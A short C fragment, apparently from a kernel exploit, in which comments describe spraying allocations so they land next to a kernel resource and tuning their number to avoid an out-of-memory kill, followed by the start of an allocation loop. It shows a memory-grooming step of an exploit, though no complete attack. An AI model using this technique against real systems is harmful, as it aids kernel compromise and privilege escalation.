    // NPerm allocations to land in our target area, which is next to kernel resource.
    // Tuning to_allocate: too small -> target page not occupied; too large -> OOM kill.
    // The sweet spot is wide, so we just double it until we find a working value.
    size_t  to_allocate = 0x10000;
    for(int i = 0 ; i < to_allocate; i+=1){
